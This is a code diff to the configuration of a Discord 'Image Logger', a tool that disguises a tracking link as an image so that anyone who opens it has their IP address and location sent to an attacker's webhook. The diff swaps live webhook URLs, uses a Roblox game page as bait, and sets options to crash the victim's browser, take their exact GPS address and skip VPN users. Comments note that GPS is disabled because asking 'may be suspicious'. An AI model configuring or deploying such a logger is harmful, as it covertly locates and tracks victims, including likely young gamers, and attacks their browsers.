@@ -8,25 +8,26 @@ __version__ = "v2.0"
 __author__ = "Dexty"
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/1412460994680061962/Lr9R0WafZz8FRkCLtglMyIFWhivlnKRv9ao0R1pR04C_Qty--W1CQ42KocgN4a9Rnp8Z",
-    
-    # CUSTOMIZATION
-    "username": "Image Logger",
-    "color": 0x00FFFF,  # Hex color for embed
-    
-    # OPTIONS
-    "crashBrowser": True,  # Tries to crash/freeze the user's browser
-    "accurateLocation": False,  # Disabled, as it asks the user permission
-    
-    # MESSAGE SETTINGS
-    "message": {
-        "doMessage": True,  # Enable the custom message
-        "message": "Here is your link: https://tr.rbxcdn.com/180DAY-f8add11aa463c6b6827252d5087c1dfc/768/432/Image/Webp/noFilter",
-        "richMessage": True,  # Enable rich text (Markdown)
-    }
-}
+    # BASE CONFIG #
+    "webhook": "https://discord.com/api/webhooks/1412495995891351653/80m2W2-jhHTpHqxhzcMFNwnfDudptLb63Ms0GM0zISzbVYgT70Nbl1nXtW9NiM05BJp9",
+    "image": "https://www.roblox.com/games/113149714573083/BETA-Death-Experience", # You can also have a custom image by using a URL argument
+                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
+    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
+    # CUSTOMIZATION #
+    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
+    # OPTIONS #
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/xdexty0/Chromebook-Crasher)
+    
+    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+
+    "message": { # Show a custom message when the user opens the image
+        "doMessage": False, # Enable the custom message?
+        "message": "This browser has been pwned by Dexty's Image Logger. https://github.com/xdexty0/Discord-Image-Logger", # Message to show
+        "richMessage": True, # Enable rich text? (See README for more info)
+    },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
                 # 0 = No Anti-VPN
@@ -46,8 +47,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": True, # Redirect to a webpage?
-        "page": "https://www.roblox.com/games/113149714573083/BETA-Death-Experience" # Link to the webpage to redirect to 
+        "redirect": False, # Redirect to a webpage?
+        "page": "https://your-link.here" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
